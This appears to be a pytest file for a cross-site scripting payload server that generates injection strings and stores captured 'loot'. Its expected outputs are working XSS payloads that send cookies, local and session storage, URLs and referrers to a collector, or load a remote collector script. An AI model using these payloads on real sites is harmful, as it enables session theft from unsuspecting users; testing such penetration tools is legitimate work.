import base64
import json

from app.models import XSS, Client

from .fixtures import client
from .functions import *


def test_generate_payload(client):
    access_header, _ = login_get_headers(client, "admin", "xss")
    create_client(client, access_header, name="name1", description="desc1")
    client_name1 = Client.query.first()
    rv = generate_payload(
        client,
        access_header,
        client_id=1,
        url="http://127.0.0.1",
        xss_type="s",
        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer"],
        code_type="html",
        tags=["tag1", "tag2"],
    )
    expected_response = f'\'>"><script>new Image().src="http://127.0.0.1/api/x/s/{client_name1.uid}?tags=tag1,tag2&cookies="+encodeURIComponent(document.cookie)+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"&origin_url="+encodeURIComponent(location.href)+"&referrer="+encodeURIComponent(document.referrer)</script>'
    assert rv.get_json()["detail"] == expected_response
    rv = generate_payload(
        client,
        access_header,
        client_id=1,
        code_type="js",
        xss_type="r",
        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
        url="http://127.0.0.1",
    )
    b64_payload = base64.b64encode(str.encode(",".join(["r", client_name1.uid, "", ""]))).decode()
    expected_response = f';}};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.setAttribute("data", "{b64_payload}");document.body.appendChild(js);'

    assert rv.get_json()["detail"] == expected_response
    rv = generate_payload(client, access_header, client_id=1)
    assert b"Missing url" in rv.data
    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1")
    assert b"Missing xss_type" in rv.data
    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", xss_type="s")
    assert b"Missing code_type" in rv.data
    rv = generate_payload(client, access_header, url="http://127.0.0.1")
    assert b"Missing client_id" in rv.data
    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r")
    expected_response = ';};new Image().src="http://127.0.0.1/api/x/r/' + client_name1.uid + '";'
    assert rv.get_json()["detail"] == expected_response
    rv = generate_payload(
        client,
        access_header,
        client_id=1,
        url="http://127.0.0.1",
        code_type="html",
        xss_type="r",
        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
    )
    b64_payload = base64.b64encode(str.encode(",".join(["r", client_name1.uid, "", ""]))).decode()
    expected_response = f'\'>"><script src=http://127.0.0.1/static/collector.min.js data="{b64_payload}"></script>'
    assert rv.get_json()["detail"] == expected_response
    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="html", xss_type="r")
    expected_response = '\'>"><img src="http://127.0.0.1/api/x/r/{}" />'.format(client_name1.uid)
    assert rv.get_json()["detail"] == expected_response
    rv = generate_payload(
        client,
        access_header,
        client_id=1,
        url="http://127.0.0.1",
        code_type="js",
        xss_type="r",
        tags=["tag1", "tag2"],
        to_gather=["origin_url"],
    )
    expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?tags=tag1,tag2&origin_url="+encodeURIComponent(location.href);'
    assert rv.get_json()["detail"] == expected_response
    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r", tags=["tag1", "tag2"])
    expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?tags=tag1,tag2;'
    assert rv.get_json()["detail"] == expected_response
    rv = generate_payload(
        client,
        access_header,
        client_id=1,
        url="http://127.0.0.1",
        code_type="js",
        xss_type="r",
        to_gather=["origin_url"],
    )
    expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?origin_url="+encodeURIComponent(location.href);'
    assert rv.get_json()["detail"] == expected_response


def test_delete_xss(client):
    access_header, _ = login_get_headers(client, "admin", "xss")
    create_client(client, access_header, name="name1", description="desc1")
    client_name1 = Client.query.first()
    get_x(client, access_header, "s", client_name1.uid)
    assert XSS.query.count() == 1
    delete_xss(client, access_header, 1)
    assert XSS.query.count() == 0


def test_get_loot(client):
    access_header, _ = login_get_headers(client, "admin", "xss")
    create_client(client, access_header, name="name1", description="desc1")
    client_name1 = Client.query.first()
    get_x(client, access_header, "s", client_name1.uid, cookies="cookie=good")
    rv = get_loot_type(client, access_header, 1, "cookies")
    assert json.loads(rv.data)["data"] == {"cookie": "good"}


def test_delete_loot(client):
    access_header, _ = login_get_headers(client, "admin", "xss")
    create_client(client, access_header, name="name1", description="desc1")
    client_name1 = Client.query.first()
    get_x(client, access_header, "s", client_name1.uid, cookies="cookie=good")
    delete_loot_type(client, access_header, 1, "cookies")
    assert json.loads(XSS.query.first().data) == {}


def test_get_xss_all(client):
    access_header, _ = login_get_headers(client, "admin", "xss")
    create_client(client, access_header, name="name1", description="desc1")
    client1 = Client.query.filter_by(id=1).first()
    get_x(client, access_header, "r", client1.uid)
    rv = get_xss_all(client, access_header, client_id=1, type="reflected")
    assert len(json.loads(rv.data)) == 1
    rv = get_xss_all(client, access_header, client_id=1, type="badtype")
    assert b"Unknown XSS type" in rv.data
    rv = get_xss_all(client, access_header, client_id="asd", type="reflected")
    assert b"Bad client ID" in rv.data


def test_get_xss(client):
    access_header, _ = login_get_headers(client, "admin", "xss")
    create_client(client, access_header, name="name1", description="desc1")
    client1 = Client.query.filter_by(id=1).first()
    get_x(client, access_header, "r", client1.uid)
    rv = get_xss(client, access_header, 1)
    assert "ip_addr" in json.loads(rv.data).keys()


def test_get_all_loot(client):
    access_header, _ = login_get_headers(client, "admin", "xss")
    create_client(client, access_header, name="name1", description="desc1")
    client1 = Client.query.filter_by(id=1).first()
    get_x(client, access_header, "r", client1.uid, test_data="test", dom="<h1>test</h1>")
    rv = get_loot(client, access_header, client_id=1)
    for xss in json.loads(rv.data):
        for element_name, element_value in xss["data"].items():
            if element_name == "test_data":
                assert element_value == "test"
            if element_name == "dom":
                assert element_value == ""
    rv = get_loot(client, access_header, client_id="asd")
    assert b"Bad client ID" in rv.data
